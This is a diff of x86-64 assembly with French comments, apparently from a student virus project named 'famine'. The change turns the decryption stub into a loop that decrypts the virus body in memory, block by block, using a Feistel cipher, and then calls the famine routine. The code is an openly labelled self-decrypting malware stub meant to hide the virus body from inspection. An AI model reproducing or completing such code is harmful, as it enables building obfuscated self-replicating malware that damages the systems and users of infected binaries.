@@ -44,86 +44,60 @@ _start:
     push    r8
 
 	;si je suis l'original
-	jmp NEAR end_decrypt
+	jmp NEAR decrypt_done
     ; 0x55555555a1cc
 
-    xor r15, r15
-    ; sub rsp, 8                    ; Réserver 8 octets sur la pile pour `block`
-	; debut = lea r8, [rel famine]
-	; lea r8, [rel famine]
-	;va load l'addresse du debut de la fonction famine (virus)
-    mov r8, 0xF232B1C13CEDE077  ; r8 contient le message complet (64 bits)
-    bswap r8
-	; fin = lea r9, [rel _start]
-	; lea r9, [rel _start]
-	; va load l'addresse du debut de start (fin du virus, start non compris)
-    mov r9, 8                   ; r9 contient la longueur du message (8 octets)
-    mov r10, 0x123456789ABCDEF0 ; r10 contient la clé (64 bits)
+    ; Adresse de début : famine
+    lea r8, [rel famine]             ; Adresse de début (famine)
 
+    ; Adresse de fin : _start
+    lea r9, [rel _start]       ; Adresse de fin (_start)
 
-; Boucle pour parcourir le message
-process_message:
-    mov rax, r15                  ; Charger l'index actuel
-    cmp rax, r9          ; Comparer avec la taille totale
-    jge end_decrypt              ; Si l'index dépasse la taille, fin
+    ; Clé de décryptage
+    mov r10, 0x00000000      ; Exemple de clé 64 bits
 
-    ; Charger un bloc de 8 bytes à partir de l'index
-    mov r12, r8                ; Stocker le bloc dans `block` (sur la pile)
+decrypt_loop:
+    ; Vérifier si on a atteint la fin
+    mov rax, r9
+    sub rax, r8
+    cmp rax, 8
+    jl decrypt_done                 ; Si r9 - r8 < 8, fin du décryptage
 
-decrypt:
-    ; Charger les parties haute et basse dans left et right
-    mov r14d, r12d                ; right = partie basse du bloc (32 bits)
-    shr r12, 32                   ; Décaler pour obtenir la partie haute
-    mov r13d, r12d                ; left = partie haute du bloc (32 bits)
+    ; Charger un bloc de 8 octets à partir de l'adresse actuelle
+    mov	r12, [r8]                    ; Charger le bloc chiffré dans r12
 
-    ; Décryptage du bloc (8 rounds inverses)
-    mov ecx, 0x7
+    ; Début de la routine de décryptage
+    mov r14d, r12d                   ; right = partie basse du bloc
+    shr r12, 32                      ; Décaler pour obtenir la partie haute
+    mov r13d, r12d                   ; left = partie haute du bloc
 
+    mov ecx, 0x7                     ; 8 rounds inverses
+    
 reverse_rounds:
-    ; Calcul de la sous-clé : subkey = key ^ (round * 0x1234ABCD)
-    mov eax, ecx                  ; subkey = round
-    imul eax, eax, 0x1234ABCD     ; subkey = (subkey * 0x1234ABCD)
-    xor eax, r10d                ; subkey = subkey ^ key
+    mov eax, ecx                     ; Calcul de la sous-clé
+    imul eax, eax, 0x1234ABCD        ; subkey = round * 0x1234ABCD
+    xor eax, r10d                    ; subkey ^= clé
 
     ; Feistel déchiffrement
-    mov r11d, r14d                ; temp = left
-
-    ; Calculer left = right ^ feistel_function(left, subkey)
+    mov r11d, r14d                   ; temp = right
     mov esi, r14d
     shl esi, 3
     mov edi, r14d
     shr edi, 29
     or  esi, edi
-    ; esi = ((block << 3) | (block >> 29))
-
     xor r14d, eax
-    ; [left] = [left] ^ subkey
-
-    add r14d, esi                 ; [left] = (block ^ subkey) + ((block << 3) | (block >> 29))
-
-    mov eax, r13d
-    xor r14d, eax
-
-    ; Mettre à jour right
-    mov eax, r11d                 ; r = temp
-    mov r13d, eax                 ; right = r
-
-    dec ecx                       ; round--
-    jns reverse_rounds            ; si round >= 0 recommence
+    add r14d, esi
+    xor r14d, r13d                   ; left = right ^ feistel_function(left, subkey)
+    mov r13d, r11d                   ; right = temp
+    dec ecx
+    jns reverse_rounds               ; Répéter pour tous les rounds
 
     ; Recomposer le bloc déchiffré
-    shl r13, 32                   ; Décaler right pour le positionner dans la moitié haute
-    or r14, r13                   ; Fusionner left et right
-    ; mov [rsp], r14                ; Stocker le bloc déchiffré dans `block` (pile)
+    shl r13, 32
+    or r14, r13                      ; Fusionner left et right
+    mov [r8], r14                    ; Stocker le bloc déchiffré dans la mémoire
 
-display_decrypted_block:
-    ; mov rdi, 1                    ; stdout
-    ; ; lea rsi, [rsp]                ; Adresse du bloc sur la pile
-    ; mov rdx, 8                    ; Taille du bloc (8 octets)
-    ; mov rax, 1                    ; syscall write
-    ; syscall
-
-    push	0x0a2e2e2e	;	...\n
+    push	0x0a2e2e2e	;	...\n   
 	push	0x59444f4f	;	OODY
 	push	0x572e2e2e	;	...W
 
@@ -138,16 +112,12 @@ display_decrypted_block:
 	pop	rax
 	pop	rax
 	pop	rax
-    
-    ; Passer au bloc suivant
-    add r15, 8                    ; Avancer l'index de 8 bytes
-    jmp process_message           ; Retourner dans la boucle
 
+    ; Passer au bloc suivant (8 octets)
+    add r8, 8
+    jmp decrypt_loop
 
-	
-
-end_decrypt:
-	; add rsp, 8
+decrypt_done:
 	call	famine	
 
 
